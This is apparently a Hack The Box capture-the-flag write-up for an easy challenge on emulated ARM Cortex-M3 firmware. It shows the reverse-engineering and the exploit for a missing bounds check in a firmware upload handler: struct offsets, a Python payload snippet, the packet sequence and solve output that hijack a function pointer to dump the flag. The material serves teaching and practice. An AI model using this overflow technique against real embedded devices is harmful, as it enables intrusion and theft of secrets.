![](../../assets/banner.png)

<img src="../../assets/htb.png" style="margin-left: 20px; zoom: 80%;" align="left" />       <font size="10">Flashpoint</font>

​        10<sup>th</sup> May 2026

​        Prepared By: 131LL

​        Challenge Author(s): 131LL

​        Difficulty: <font color=#f0a30a>Easy</font>


# Synopsis

Flashpoint is an easy pwn challenge targeting a bare metal ARM Cortex-M3 firmware update handler running under QEMU emulation. Players must reverse a custom binary protocol, identify a missing bounds check in the chunk upload handler, and exploit a controlled overflow into an adjacent update context struct to redirect a function pointer — calling a diagnostic memory dump routine with attacker-controlled arguments to extract the flag from emulated flash.

## Skills Required

- Understanding of ARM Cortex-M3 architecture and calling conventions
- Binary analysis of bare metal embedded firmware (no OS, no libc)
- Understanding of fixed memory layouts and struct-based exploitation
- Familiarity with custom binary protocols

## Skills Learned

- Reversing bare metal ARM firmware in Ghidra
- Exploiting a missing bounds check to overflow into an adjacent struct
- Understanding the ARM Cortex-M Thumb bit requirement for function pointers
- Leveraging compiler-generated argument passing to control registers without ROP

# Enumeration

### Protections

Let's start by running `file` against the binary:

```bash
$ file flashpoint
flashpoint: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV),
statically linked, not stripped
```

This is a statically linked ARM 32-bit ELF — no dynamic linker, no shared libraries. There is no OS underneath it, no libc, and no memory protection hardware.

Addresses are fixed and the memory layout is entirely predictable. The binary runs under QEMU emulating an MPS2-AN385 Cortex-M3 platform.

### Program Interface

Running the binary via the provided `run.sh`:

```bash
$ ./run.sh

==========================================
  NIGHTFALL TYPE-IV RELAY STATION
  Embedded Firmware Update Handler
  v1.2.3 // Nightfall Command
  Classification: UMBRA // RESTRICTED
==========================================

[BOOT] Waiting for firmware update packet...
[BOOT] Protocol: NFWU over UART0
```

### Disassembly ⛏️

The binary listens on UART for binary packets in the NFWU protocol. The provided `memory_map.h` documents the packet format:

```C
#define PKT_MAGIC_0         0x4E        // 'N'
#define PKT_MAGIC_1         0x46        // 'F'
#define PKT_MAGIC_2         0x57        // 'W'
#define PKT_MAGIC_3         0x55        // 'U'

#define PKT_CMD_INFO        0x01
#define PKT_CMD_UPLOAD      0x02
#define PKT_CMD_VERIFY      0x03
#define PKT_CMD_APPLY       0x04
```

Sending an INFO packet returns the bootloader version and confirms the connection:

```
[INFO] NIGHTFALL Firmware Update Handler v1.2.3
[INFO] Target: MPS2-AN385 Cortex-M3
[INFO] Flash slot: 0x00008000 (0x00010000 bytes)
[INFO] Ready for UPLOAD
```

The UPLOAD command accepts firmware chunks, VERIFY runs a signature check, and APPLY flashes the image. The `memory_map.h` also documents the fixed SRAM layout:

```C
#define UPLOAD_BUF_ADDR     0x20008000
#define UPDATE_CTX_ADDR     0x200081E0
```

Also, taking a look at the dockerfile, we can see where the flag file is loaded into memory:

```
-device loader\\,file=/home/ctf/flag.txt\\,addr=0x00018000
```

Knowing where things live in memory before touching Ghidra is a significant head start.

Now, let's take a look at the disassembly of some interesting functions:

**`mem_dump` :**

```C
void mem_dump(byte *param_1,int param_2)
{
  byte *pbVar1;
  
  pbVar1 = param_1 + param_2;
  for (; param_1 != pbVar1; param_1 = param_1 + 1) {
    do {
    } while (_DAT_40004004 << 0x1c < 0);
    _DAT_40004000 = (uint)*param_1;
  }
  return;
}
```

This function allows us to dump memory from the SRAM, but it is not called in normal operation. We will be using this to leak the flag through the UART.

**`handle_upload` :**

```C
void handle_upload(ushort *param_1,uint param_2,uint param_3,undefined4 param_4)
{
  undefined4 uVar1;
  uint extraout_r1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  
  if (param_2 < 4) {
    uVar1 = 0x547;
  }
  else {
    uVar3 = (*param_1 & 0xff) << 8 | (uint)(*param_1 >> 8);
    iVar2 = param_2 - 4;
    uVar4 = (param_1[1] & 0xff) << 8 | (uint)(param_1[1] >> 8);
    uart_puts(0x56b);
    uart_puthex8(uVar3);
    uart_puts(0x57b);
    uart_puthex8(uVar4);
    uart_puts(0x520);
    uart_puthex32(iVar2);
    uart_puts(0x523);
    if (uVar3 == 0) {
      memset_bare(&DAT_200081e0,0,0x18);
      _DAT_200081f0 = 1;
      _DAT_200081f4 = 0xb3;
      _DAT_200081ec = 0;
      _DAT_200081e8 = uVar4;
    }
    memcpy_bare(_DAT_200081ec + 0x20008000,param_1 + 2,iVar2);
    _DAT_200081ec = _DAT_200081ec + iVar2;
    _DAT_200081e4 = _DAT_200081e4 + 1;
    param_2 = extraout_r1;
    param_3 = _DAT_200081e8;
    if (_DAT_200081e4 < _DAT_200081e8) {
      uVar1 = 0x5b0;
    }
    else {
      uVar1 = 0x57d;
      _DAT_200081f0 = 2;
    }
  }
  uart_puts(uVar1,param_2,param_3,param_4);
  return;
}
```

The vulnerability is on this line:

```C
memcpy_bare(_DAT_200081ec + 0x20008000, param_1 + 2, iVar2);
```

* `_DAT_200081ec` is `bytes_written` from `update_ctx` — the current write offset into upload_buf. `0x20008000` is the address of the upload buffer - we can see this in the `memory_map.h` file.

* `param_1 + 2` is the chunk data (payload pointer, skipping the 2-byte chunk_id and chunk_total fields)

* `iVar2` is `param_2 - 4` — the data length, derived directly from the packet header's `payload_len` field.

The copy length `iVar2` comes entirely from the packet header and is never compared against the remaining space in `upload_buf`. The buffer is 480 bytes (`UPLOAD_BUF_SIZE = 0x1E0`). If `iVar2` exceeds that, memcpy_bare writes past the end of upload_buf and into whatever sits above it in SRAM — which is `update_ctx` at `0x200081E0`.

Let's also take a look at the initialization block:

```C
if (uVar3 == 0) {   // first chunk (chunk_id == 0)
    memset_bare(&DAT_200081e0, 0, 0x18);
    _DAT_200081f0 = 1;
    _DAT_200081f4 = 0xb3;    // <- verify_fn set to verify_signature
    _DAT_200081ec = 0;
    _DAT_200081e8 = uVar4;
}
```

`_DAT_200081f4` is `verify_fn` at `update_ctx + 0x14`, being set to `0xb3` — which is `verify_signature`.

**`handle_apply` :**

```C
void handle_apply(void)

{
  int iVar1;
  int iVar2;
  
  if (_DAT_200081f0 < 2) {
    uart_puts(0x623);
    return;
  }
  uart_puts(0x646);
  (*_DAT_200081f4)(_DAT_200081e0,_DAT_200081ec);
  uart_puts(0x672);
  iVar1 = _DAT_200081ec;
  for (iVar2 = 0; iVar2 != iVar1; iVar2 = iVar2 + 1) {
    *(undefined *)(iVar2 + 0x8000) = *(undefined *)(iVar2 + 0x20008000);
  }
  uart_puts(0x697);
  do {
                    /* WARNING: Do nothing block with infinite loop */
  } while( true );
}
```

he function first checks that _DAT_200081f0 (the state field in update_ctx) is at least 2, confirming a complete upload. Then comes the critical line:

```C
(*_DAT_200081f4)(_DAT_200081e0, _DAT_200081ec);
```

This is the indirect call through `verify_fn`. It's passing 2 arguments:

* `_DAT_200081e0` — image_size from `update_ctx + 0x00` → loaded into `r0`
* `_DAT_200081ec` — bytes_written from `update_ctx + 0x0C` → loaded into `r1`

Both of these fields sit inside `update_ctx`, which we control entirely through the overflow. This means we control `r0` and `r1` at the call site without any `ROP` — the compiler's own argument passing convention does the work for us.

Looking at the ARM disassembly listing for this call confirms it:

```
ldr.w  r3, [r4, #0xF4]   ; load verify_fn     -> r3
ldr.w  r1, [r4, #0xEC]   ; load bytes_written -> r1
ldr.w  r0, [r4, #0xE0]   ; load image_size    -> r0
blx    r3                 ; indirect call
```

### Exploitation

To summarise what the analysis reveals:

- `handle_upload()` copies chunk data into `upload_buf` using `payload_len` from the packet header as the copy length — no bounds check against the 480-byte buffer size
- `update_ctx` sits immediately above `upload_buf` in SRAM, containing a `verify_fn` function pointer at offset `+0x14`
- `handle_apply()` calls `verify_fn(image_size, bytes_written)` — passing two `update_ctx` fields as arguments in `r0` and `r1`
- `mem_dump(addr, len)` exists in the binary as an unreachable diagnostic function that reads from an arbitrary address and transmits over UART
- The flag is not in the ELF — it is loaded into flash at `0x00018000` at runtime via QEMU's `-device loader`

Since the overflow controls the entire `update_ctx`, we control `r0` and `r1` at the call site without any ROP — the compiler does it for us:

```asm
ldr.w  r3, [r4, #0xF4]   ; load verify_fn        -> r3
ldr.w  r1, [r4, #0xEC]   ; load bytes_written     -> r1
ldr.w  r0, [r4, #0xE0]   ; load image_size        -> r0
blx    r3                 ; call verify_fn(r0, r1)
```

We set:

```
image_size    = 0x00018000   -> r0 = address for mem_dump
bytes_written = 64           -> r1 = length for mem_dump
verify_fn     = 0x173        -> mem_dump | 1 (Thumb bit)
```

**The Thumb bit** is the Cortex-M specific requirement. `mem_dump` is at `0x00000172`. Writing `0x172` into `verify_fn` causes a UsageFault — Cortex-M only supports Thumb mode, and the processor checks bit 0 of any function pointer before branching. Writing `0x172` signals ARM mode, which Cortex-M does not have. Writing `0x173` (`mem_dump | 1`) sets the Thumb bit and executes correctly. This is the detail that catches anyone approaching this from an x86 or MIPS background.

**Building the payload:**

The overflow offset from `upload_buf[0]` to each field we need to control:

```
offset 0x1E0 (480 bytes): image_size    = 0x00018000
offset 0x1EC (492 bytes): bytes_written = 64
offset 0x1F4 (500 bytes): verify_fn     = 0x173
```

Total payload: 504 bytes — fits in a single UPLOAD chunk.

```python
payload = bytearray(b'\xAA' * TOTAL_DATA)
struct.pack_into('<I', payload, IMAGE_SIZE_OFF, KEY_MATERIAL)  # r0
struct.pack_into('<I', payload, BYTES_WR_OFF,   FLAG_LEN)      # r1
struct.pack_into('<I', payload, VERIFY_FN_OFF,  MEM_DUMP_T)   # verify_fn
```

We send three packets in sequence — INFO, a single UPLOAD chunk with our payload, then APPLY:

```python
p.send(info_pkt)
p.recvuntil(b'Ready for UPLOAD\r\n', timeout=10)

p.send(upload_pkt)
p.recvuntil(b'Transfer complete\r\n', timeout=10)

p.send(apply_pkt)
data = p.recvuntil(b'}', timeout=10).decode(errors='replace')
```

APPLY triggers `handle_apply()`, which calls `verify_fn(image_size, bytes_written)` — now `mem_dump(0x00018000, 64)` — which reads the flag from emulated flash and transmits it byte by byte over UART.

## Solution

```bash
$ python3 solve.py REMOTE
[*] mem_dump        : 0x173 (Thumb bit set)
[*] KEY_MATERIAL    : 0x18000 (runtime, not in ELF)
[*] flag_len        : 64 bytes
[*] image_size off  : +0x1e0 -> r0 = 0x18000
[*] bytes_writ off  : +0x1ec -> r1 = 64
[*] verify_fn off   : +0x1f4 -> 0x173
[*] total payload   : 504 bytes (1 chunk)
[*] Connecting to localhost:1337
[+] Opening connection to localhost on port 1337: Done
[*] Sending exploit chunk...
[*] Sending APPLY...
[+] Flag: HTB{********************}
```